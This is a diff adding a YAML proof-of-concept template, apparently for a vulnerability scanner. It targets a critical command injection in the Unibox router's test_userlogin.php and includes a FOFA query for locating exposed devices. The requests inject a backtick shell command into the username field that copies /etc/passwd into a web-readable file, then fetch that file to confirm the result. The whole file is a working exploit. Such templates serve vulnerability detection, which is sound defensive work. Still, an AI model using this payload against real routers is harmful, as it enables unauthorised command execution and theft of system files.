@@ -1,0 +1,19 @@
+id: poc-yaml-unibox-router-test-userlogin-php-command-injection
+info:
+  name: Unibox路由器 test_userlogin.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: unibox_administration
+  fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
+variables:
+  t1: random_str(5)
+requests:
+- method: GET
+  path: /authentication/test_userlogin.php?testuser=1&username=`cat%20/etc/passwd>{{.t1}}.txt`%20%23%20
+  expression: status_code == 200 && contains(body,"Test User Login")
+- method: GET
+  path: /authentication/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
